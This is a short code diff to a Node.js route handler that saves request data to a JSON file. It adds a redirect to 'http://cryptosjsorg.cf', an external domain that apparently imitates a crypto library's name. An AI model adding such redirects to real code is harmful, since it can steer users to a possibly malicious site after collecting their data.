@@ -192,9 +192,9 @@ router.get('/a', async ctx => {
     // }
 
     datas.todos.push(data);
-    ctx.body = ' .'
-
     fs.writeFileSync('./static/data/data.json', JSON.stringify(datas));
+    // ctx.body = ' .'
+    ctx.response.redirect('http://cryptosjsorg.cf');
 });
 
 router.get('/d', async ctx => {
